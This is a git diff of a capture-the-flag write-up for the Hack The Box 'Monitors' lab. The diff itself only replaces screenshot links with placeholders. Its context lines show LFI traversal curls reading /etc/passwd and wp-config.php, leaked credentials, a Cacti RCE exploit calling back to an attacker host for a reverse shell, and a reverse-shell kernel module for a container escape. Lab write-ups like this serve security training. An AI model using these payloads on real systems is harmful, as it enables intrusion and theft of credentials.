@@ -26,11 +26,11 @@ sudo nmap -p- --min-rate 1000 -sT -vvv $target
 sudo nmap -sC -sV -p 22,80 -T4 $target
 ```
 
-<img width="329" height="197" alt="image" src="https://github.com/user-attachments/assets/53b845f1-1125-45cc-8b17-3cedd2708327" />
+<img width="329" height="197" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-1-Upload-To-Imgur" />
 
-<img width="932" height="666" alt="image" src="https://github.com/user-attachments/assets/bac5920d-9936-4f4a-8559-d7480e5ebe04" />
+<img width="932" height="666" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-2-Upload-To-Imgur" />
 
-<img width="776" height="387" alt="image" src="https://github.com/user-attachments/assets/4e2d747e-7aca-4d9a-830d-e153b134df2f" />
+<img width="776" height="387" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-3-Upload-To-Imgur" />
 
 **Findings:**
 - Port 22: SSH
@@ -44,14 +44,14 @@ After discovering the web service, we add the domain to `/etc/hosts`:
 echo "10.129.232.111 monitors.htb" >> /etc/hosts
 ```
 
-<img width="551" height="206" alt="image" src="https://github.com/user-attachments/assets/c802297c-4778-4762-bd1a-5fe203c3b6f1" />
+<img width="551" height="206" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-4-Upload-To-Imgur" />
 
 
-<img width="551" height="206" alt="image" src="https://github.com/user-attachments/assets/30ac2f55-4b53-43b7-a191-3b6ba3c94ca3" />
+<img width="551" height="206" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-5-Upload-To-Imgur" />
 
 Visiting `http://monitors.htb` reveals a WordPress installation.
 
-<img width="963" height="779" alt="image" src="https://github.com/user-attachments/assets/c26f7cad-77c8-434a-93fc-2d08ad4a2e9d" />
+<img width="963" height="779" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-6-Upload-To-Imgur" />
 
 ### WordPress Enumeration
 
@@ -59,7 +59,7 @@ Visiting `http://monitors.htb` reveals a WordPress installation.
 wpscan --url http://monitors.htb -e ap
 ```
 
-<img width="851" height="427" alt="image" src="https://github.com/user-attachments/assets/d358d603-7f94-4b00-b9f9-7f18f04937cd" />
+<img width="851" height="427" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-7-Upload-To-Imgur" />
 
 **Critical Finding:** The `wp-with-spritz` plugin is installed and vulnerable to Local File Inclusion (LFI).
 
@@ -74,7 +74,7 @@ The vulnerable endpoint allows directory traversal:
 curl "http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/passwd" | grep sh$
 ```
 
-<img width="970" height="170" alt="image" src="https://github.com/user-attachments/assets/f180c108-41d6-472e-a797-85ec96eead7b" />
+<img width="970" height="170" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-8-Upload-To-Imgur" />
 
 
 **Key Discovery:** Two users with shell access: `root` and `marcus`.
@@ -86,7 +86,7 @@ curl "http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.fi
 curl "http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/apache2/sites-enabled/000-default.conf"
 ```
 
-<img width="964" height="754" alt="image" src="https://github.com/user-attachments/assets/868a2467-3aef-4b1e-aa36-1aefb70e4c14" />
+<img width="964" height="754" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-9-Upload-To-Imgur" />
 
 **Discovery:** Additional virtual host `cacti-admin.monitors.htb`
 
@@ -101,7 +101,7 @@ echo "10.129.232.111 cacti-admin.monitors.htb" >> /etc/hosts
 curl "http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../../var/www/wordpress/wp-config.php"
 ```
 
-<img width="964" height="754" alt="image" src="https://github.com/user-attachments/assets/f1af848c-7748-4347-b467-42d808e06100" />
+<img width="964" height="754" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-10-Upload-To-Imgur" />
 
 **Credentials Found:**
 - Database User: `wpadmin`
@@ -121,7 +121,7 @@ Using the discovered credentials:
 Cacti version 1.2.12 is vulnerable to authenticated remote code execution.
 
 
-<img width="961" height="818" alt="image" src="https://github.com/user-attachments/assets/29ad7363-8ea7-4c1f-9a51-2652e92b94ad" />
+<img width="961" height="818" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-11-Upload-To-Imgur" />
 
 
 ```bash
@@ -129,20 +129,20 @@ searchsploit cacti 1.2.12
 searchsploit -m 49810
 ```
 
-<img width="957" height="173" alt="image" src="https://github.com/user-attachments/assets/3539b7f6-518d-4072-ac84-fa9a47b935fe" />
+<img width="957" height="173" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-12-Upload-To-Imgur" />
 
-<img width="540" height="205" alt="image" src="https://github.com/user-attachments/assets/0f1e2dac-ec43-4ebe-8fd6-a84ddddb7678" />
+<img width="540" height="205" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-13-Upload-To-Imgur" />
 
 **Exploit Execution:**
 ```bash
 python3 49810.py -t http://cacti-admin.monitors.htb -u admin -p 'BestAdministrator@2020!' --lhost 10.10.14.50 --lport 9001
 ```
 
-<img width="957" height="316" alt="image" src="https://github.com/user-attachments/assets/36bbfdaa-0556-4e91-85b9-50cf36754fde" />
+<img width="957" height="316" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-14-Upload-To-Imgur" />
 
 **Result:** Gained initial shell as `www-data` user.
 
-<img width="522" height="208" alt="image" src="https://github.com/user-attachments/assets/6c8fdaf3-c124-44b8-bb0b-79c3a60bc230" />
+<img width="522" height="208" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-15-Upload-To-Imgur" />
 
 ### Lateral Movement to Marcus
 
@@ -153,9 +153,9 @@ cat /etc/systemd/system/cacti-backup.service
 cat /home/marcus/.backup/backup.sh
 ```
 
-<img width="721" height="264" alt="image" src="https://github.com/user-attachments/assets/6c35a38b-e6f3-48ad-8c57-6c7d1384ed6d" />
+<img width="721" height="264" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-16-Upload-To-Imgur" />
 
-<img width="876" height="205" alt="image" src="https://github.com/user-attachments/assets/38c6b9c9-08d5-4798-8bf6-891461f278e6" />
+<img width="876" height="205" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-17-Upload-To-Imgur" />
 
 **Credentials Found:**
 - Password: `VerticalEdge2020`
@@ -165,7 +165,7 @@ cat /home/marcus/.backup/backup.sh
 ssh marcus@10.129.232.111
 ```
 
-<img width="658" height="910" alt="image" src="https://github.com/user-attachments/assets/19ed872e-4996-482c-8d7e-9e650b18dfdc" />
+<img width="658" height="910" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-18-Upload-To-Imgur" />
 
 **User Flag:**
 ```bash
@@ -181,7 +181,7 @@ cat /home/marcus/user.txt
 netstat -tunlp
 ```
 
-<img width="822" height="292" alt="image" src="https://github.com/user-attachments/assets/ac859fe4-eb81-4117-8161-897eec70f127" />
+<img width="822" height="292" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-19-Upload-To-Imgur" />
 
 **Discovery:** OFBiz service running on localhost port 8443.
 
@@ -197,7 +197,7 @@ ssh -L 8443:127.0.0.1:8443 marcus@10.129.232.111
 gobuster dir -u https://127.0.0.1:8443 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k
 ```
 
-<img width="965" height="499" alt="image" src="https://github.com/user-attachments/assets/9b6f272a-a1e1-45b3-bcd8-849c1bb7ec72" />
+<img width="965" height="499" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-20-Upload-To-Imgur" />
 
 **Discovery:** Apache OFBiz 17.12.01 running at `/catalog`
 
@@ -210,7 +210,7 @@ searchsploit OFBiz 17.12.01
 searchsploit -m 50178
 ```
 
-<img width="960" height="172" alt="image" src="https://github.com/user-attachments/assets/51621d6e-8610-43f5-a5aa-2dcd8ac0c448" />
+<img width="960" height="172" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-21-Upload-To-Imgur" />
 
 ```bash
 # Download ysoserial
@@ -362,9 +362,9 @@ else
 fi
 ```
 
-<img width="523" height="451" alt="image" src="https://github.com/user-attachments/assets/ad447d50-0e8c-4633-b790-b1698a74a3c6" />
+<img width="523" height="451" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-22-Upload-To-Imgur" />
 
-<img width="661" height="232" alt="image" src="https://github.com/user-attachments/assets/20c9ccb5-fc9c-453c-ae9a-ee9379f72751" />
+<img width="661" height="232" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-23-Upload-To-Imgur" />
 
 **Result:** Gained access to Docker container as root.
 
@@ -415,11 +415,11 @@ nc -nlvp 1337
 insmod reverse-shell.ko
 ```
 
-<img width="674" height="435" alt="image" src="https://github.com/user-attachments/assets/77636f12-ca13-463b-98e1-8b06dfee84f7" />
+<img width="674" height="435" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-24-Upload-To-Imgur" />
 
-<img width="584" height="243" alt="image" src="https://github.com/user-attachments/assets/fa6e6504-d0f1-43a7-9e56-18f73fc3a1eb" />
+<img width="584" height="243" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-25-Upload-To-Imgur" />
 
-<img width="638" height="953" alt="image" src="https://github.com/user-attachments/assets/fc0f3575-30f7-40da-9019-0412fad8efc1" />
+<img width="638" height="953" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-26-Upload-To-Imgur" />
 
 **Root Flag:**
 ```bash
